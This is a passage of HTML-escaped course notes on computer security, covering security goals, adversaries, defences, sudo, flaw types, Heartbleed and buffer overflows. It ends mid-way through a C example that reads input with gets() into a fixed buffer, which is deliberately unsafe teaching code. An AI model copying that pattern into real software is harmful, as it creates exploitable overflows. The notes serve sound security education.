      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;1&lt;/td&gt;
          &lt;td&gt;Jan 23&lt;/td&gt;
          &lt;td&gt;Feb 09&lt;/td&gt;
          &lt;td&gt;17&lt;/td&gt;
          &lt;td&gt;25%&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;2&lt;/td&gt;
          &lt;td&gt;Feb 13&lt;/td&gt;
          &lt;td&gt;Mar 01&lt;/td&gt;
          &lt;td&gt;17&lt;/td&gt;
          &lt;td&gt;25%&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;3&lt;/td&gt;
          &lt;td&gt;Mar 05&lt;/td&gt;
          &lt;td&gt;Mar 22&lt;/td&gt;
          &lt;td&gt;17&lt;/td&gt;
          &lt;td&gt;25%&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;4&lt;/td&gt;
          &lt;td&gt;Mar 26&lt;/td&gt;
          &lt;td&gt;Apr 05&lt;/td&gt;
          &lt;td&gt;10&lt;/td&gt;
          &lt;td&gt;25%&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;textbooks&#34; &gt;Textbooks
&lt;span&gt;
    &lt;a href=&#34;#textbooks&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://link.springer.com/book/10.1007/978-3-030-83411-13th&#34;&gt;Computer Security and the Internet&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://eopcw.com/assets/stores/Computer%20Security/lecturenote_1704978481security-in-computing-5-e.pdf&#34;&gt;Security in Computing 5th edition&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;goals-cia&#34; &gt;Goals (CIA)
&lt;span&gt;
    &lt;a href=&#34;#goals-cia&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Confidentiality: limiting access to authorized parties&lt;/li&gt;
&lt;li&gt;Integrity: when you receive data, you get the &amp;ldquo;right&amp;rdquo; data&lt;/li&gt;
&lt;li&gt;Availability: the system or data is there when you want it
&lt;ul&gt;
&lt;li&gt;Hardest to uphold since attacker has many ways to take down a system&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;security-and-privacy&#34; &gt;Security and Privacy
&lt;span&gt;
    &lt;a href=&#34;#security-and-privacy&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;When the entities are different, they may appear to be opposing, but when the entity is the same (you), then it works complimentary
&lt;ul&gt;
&lt;li&gt;Airport Security&lt;/li&gt;
&lt;li&gt;App sandboxing and permissions&lt;/li&gt;
&lt;li&gt;PIPEDA (Personal Information Protection and Electronic Documents Act) for private-sector privacy legislation
&lt;ul&gt;
&lt;li&gt;Forthcoming Consumer Privacy Protection Act to modernize protection: meaningful consent, right to erasure&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;adversaries&#34; &gt;Adversaries
&lt;span&gt;
    &lt;a href=&#34;#adversaries&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Murphy Amateurs
&lt;ul&gt;
&lt;li&gt;Bugs waiting to be exploited&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Script kiddies
&lt;ul&gt;
&lt;li&gt;People who just copy attacks from other people&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Crackers or Hackers
&lt;ul&gt;
&lt;li&gt;Hacker is a general term, not necessarily related to security&lt;/li&gt;
&lt;li&gt;Cracker is 100% only related to writing things for script kiddies and etc.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Organized crime&lt;/li&gt;
&lt;li&gt;Government &amp;ldquo;cyberwarriors&amp;rdquo;&lt;/li&gt;
&lt;li&gt;Terrorists&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;terminology&#34; &gt;Terminology
&lt;span&gt;
    &lt;a href=&#34;#terminology&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Assets&lt;/li&gt;
&lt;li&gt;Vulnerability
&lt;ul&gt;
&lt;li&gt;Weaknesses that may be able to be exploited&lt;/li&gt;
&lt;li&gt;e.g. file server without authentication&lt;/li&gt;
&lt;li&gt;API to access GPS coordinates without authenticating apps&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Threats
&lt;ul&gt;
&lt;li&gt;A loss or harm&lt;/li&gt;
&lt;li&gt;Interception&lt;/li&gt;
&lt;li&gt;Interruption&lt;/li&gt;
&lt;li&gt;Modification&lt;/li&gt;
&lt;li&gt;Fabrication&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Attack
&lt;ul&gt;
&lt;li&gt;An action which exploits a vulnerability to execute a threat&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Control/Defence
&lt;ul&gt;
&lt;li&gt;Removing or reducing a vulnerability&lt;/li&gt;
&lt;li&gt;Prevent an attack and defend against a threat&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;methods-of-defence&#34; &gt;Methods of Defence
&lt;span&gt;
    &lt;a href=&#34;#methods-of-defence&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Prevent it&lt;/li&gt;
&lt;li&gt;Deter it&lt;/li&gt;
&lt;li&gt;Deflect it: make yourself less attractive to attacker (Xbox)&lt;/li&gt;
&lt;li&gt;Detect it&lt;/li&gt;
&lt;li&gt;Recover from it&lt;/li&gt;
&lt;li&gt;Defence in depth&lt;/li&gt;
&lt;li&gt;Your car may get stolen
&lt;ul&gt;
&lt;li&gt;Park inside your garage&lt;/li&gt;
&lt;li&gt;Lock your car&lt;/li&gt;
&lt;li&gt;Insurance&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;weakest-link&#34; &gt;Weakest Link
&lt;span&gt;
    &lt;a href=&#34;#weakest-link&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;A system is only as strong as its weakest link&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;defence-of-computer-systems&#34; &gt;Defence of Computer Systems
&lt;span&gt;
    &lt;a href=&#34;#defence-of-computer-systems&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Cryptography
&lt;ul&gt;
&lt;li&gt;Digital signatures&lt;/li&gt;
&lt;li&gt;Cryptographic protocols&lt;/li&gt;
&lt;li&gt;Unreadable to an attacker&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Software Controls
&lt;ul&gt;
&lt;li&gt;Passwords&lt;/li&gt;
&lt;li&gt;Separate user actions from each other&lt;/li&gt;
&lt;li&gt;Virus scanner&lt;/li&gt;
&lt;li&gt;Development controls&lt;/li&gt;
&lt;li&gt;Firewalls&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Hardware Controls
&lt;ul&gt;
&lt;li&gt;Fingerprint&lt;/li&gt;
&lt;li&gt;Smart tokens&lt;/li&gt;
&lt;li&gt;Trusted Execution Environments (TEEs)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Physical Controls
&lt;ul&gt;
&lt;li&gt;Locks&lt;/li&gt;
&lt;li&gt;Guards&lt;/li&gt;
&lt;li&gt;Off-site backups&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Policies and Procedures
&lt;ul&gt;
&lt;li&gt;Non-technical means can be used to protect against some classes of attack&lt;/li&gt;
&lt;li&gt;Rules about choosing passwords&lt;/li&gt;
&lt;li&gt;Training in best security practices&lt;/li&gt;
&lt;li&gt;VPN&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;program-security&#34; &gt;Program Security
&lt;span&gt;
    &lt;a href=&#34;#program-security&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;h3 id=&#34;linux-security-basics&#34; &gt;Linux Security Basics
&lt;span&gt;
    &lt;a href=&#34;#linux-security-basics&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;What is the root user, and what is sudo, and how does it work?&lt;/p&gt;
&lt;p&gt;The root user, is the super-user with user ID 0 on a Linux system which implies they have full uncapped control over the entire system and are allowed to do anything they want.&lt;/p&gt;
&lt;p&gt;Therefore, certain programs restrict actions to the root user as they are basically saying &amp;ldquo;we are doing or want to access something critical, therefore the root user needs to run this program.&amp;rdquo; This is there to protect the system from non-root users and programs.&lt;/p&gt;
&lt;p&gt;So to run programs that require the user to be root, either we log in as the root user and run every program by default with privilege or we use the &lt;code&gt;sudo&lt;/code&gt; (superuser do) program to run other programs as the root user. The sudo program is a program with root access (well one specific one which is the ability to set a program&amp;rsquo;s userID) that lets us run programs as any other user, however the default behaviour is to try running as the root user.&lt;/p&gt;
&lt;p&gt;Now how does sudo actually figure out if the non-root user can run programs as root? Security policy. It first checks if the command is allowed to be run by root by the user via the patterns in the &lt;code&gt;/etc/sudoers&lt;/code&gt; file. This means that sudo will not ask for the password. Anyways, the sudo program will do all those pattern checks and then will try to see if you are part of the sudo group. The sudo group is a group that can use the sudo command arbitrarily.&lt;/p&gt;
&lt;p&gt;Want to know if you are part of the sudo group?&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;groups &lt;span style=&#34;color:#40ffff&#34;&gt;$USER&lt;/span&gt; | grep -q sudo &amp;amp;&amp;amp; &lt;span style=&#34;color:#24909d&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;you are sudo&amp;#34;&lt;/span&gt; ||  &lt;span style=&#34;color:#24909d&#34;&gt;echo&lt;/span&gt; you are not sudo
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;flaw-faults-and-failures&#34; &gt;Flaw, faults, and failures
&lt;span&gt;
    &lt;a href=&#34;#flaw-faults-and-failures&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Flaw is a problem with a program&lt;/li&gt;
&lt;li&gt;Security flaw is a flaw that affects security in some way (confidentiality, integrity, availability)&lt;/li&gt;
&lt;li&gt;Flaws are faults or failures
&lt;ul&gt;
&lt;li&gt;A fault is a potential problem and behind the scenes&lt;/li&gt;
&lt;li&gt;Once exploited, it becomes a failure&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;finding-and-fixing-faults&#34; &gt;Finding and Fixing Faults
&lt;span&gt;
    &lt;a href=&#34;#finding-and-fixing-faults&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Fuzzing:
&lt;ul&gt;
&lt;li&gt;Test with random input&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Think like an attacker&lt;/li&gt;
&lt;li&gt;Can work backwards if user reported a failure&lt;/li&gt;
&lt;li&gt;Make patches to the program&lt;/li&gt;
&lt;li&gt;Penetrate and patch&lt;/li&gt;
&lt;li&gt;MIcrosoft&amp;rsquo;s &amp;ldquo;Patch Tuesday&amp;rdquo;&lt;/li&gt;
&lt;li&gt;Zero day: problem not known to the vendor&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Problems with patching&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;HIgh pressure to fix the fault results in narrow focus instead of broad underlying problem&lt;/li&gt;
&lt;li&gt;Fault caused other, unnoticed failures, and a partial fix&lt;/li&gt;
&lt;li&gt;Patch causes new faults, here or elsewhere&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Alternatives?&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Test based updating
&lt;ul&gt;
&lt;li&gt;Create a test for the security vulnerability and then fix code so that tests pass&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;unexpected-behaviour&#34; &gt;Unexpected Behaviour
&lt;span&gt;
    &lt;a href=&#34;#unexpected-behaviour&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Program has a spec for what the program must do&lt;/li&gt;
&lt;li&gt;From security POV, extra behaviours could be bad&lt;/li&gt;
&lt;li&gt;Always consider &amp;ldquo;and nothing else&amp;rdquo;&lt;/li&gt;
&lt;li&gt;How to test Should do vs. Should not do&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;types-of-security-flaws&#34; &gt;Types of security flaws
&lt;span&gt;
    &lt;a href=&#34;#types-of-security-flaws&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Genesis method
&lt;ul&gt;
&lt;li&gt;Intentional
&lt;ul&gt;
&lt;li&gt;Malicious&lt;/li&gt;
&lt;li&gt;Non-malicious
&lt;ul&gt;
&lt;li&gt;A backdoor or a bad security that was supposed to be removed&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Unintentional&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Most security flaws are unintentional program errors&lt;/p&gt;
&lt;h3 id=&#34;unintentional-security-flaws&#34; &gt;Unintentional Security Flaws
&lt;span&gt;
    &lt;a href=&#34;#unintentional-security-flaws&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Heartbleed Bug in OpenSSL (April 2014)&lt;/li&gt;
&lt;li&gt;TLS Heartbeat mechanism was designed to keep SSL/TLS connections alive even when no data is being transmitted&lt;/li&gt;
&lt;li&gt;Random data and a payload length&lt;/li&gt;
&lt;li&gt;Other peer supposed to respond with a mirror of exactly the same data&lt;/li&gt;
&lt;li&gt;Missing bounds check in the code&lt;/li&gt;
&lt;li&gt;Attacker can request 64KB of memory space from the same area that holds server&amp;rsquo;s private key&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://imgs.xkcd.com/comics/heartbleed_explanation_2x.png&#34; alt=&#34;Comic&#34;&gt;&lt;/p&gt;
&lt;p&gt;Types:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Buffer overflows&lt;/li&gt;
&lt;li&gt;Integer overflows&lt;/li&gt;
&lt;li&gt;Incomplete mediation&lt;/li&gt;
&lt;li&gt;Format string vulnerabilities&lt;/li&gt;
&lt;li&gt;TOCTTOU errors (Time-of-check to time-of-use)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;buffer-overflows&#34; &gt;Buffer Overflows
&lt;span&gt;
    &lt;a href=&#34;#buffer-overflows&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Most commonly exploited type of security flaw&lt;/li&gt;
&lt;li&gt;Program code (Text)&lt;/li&gt;
&lt;li&gt;Global data (BSS and data segments)&lt;/li&gt;
&lt;li&gt;Heap (dynamically allocated data)&lt;/li&gt;
&lt;li&gt;Function call data (Stack)
&lt;ul&gt;
&lt;li&gt;The stack increases (lower memory addresses) as functions are called (frames)&lt;/li&gt;
&lt;li&gt;x86 architecture&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Important addresses: Return Address and Frame Pointer&lt;/li&gt;
&lt;li&gt;Example&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;#defined LINELEN 1024
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt; buffer[LINELEN];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#447fcf&#34;&gt;gets&lt;/span&gt;(buffer);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// OR
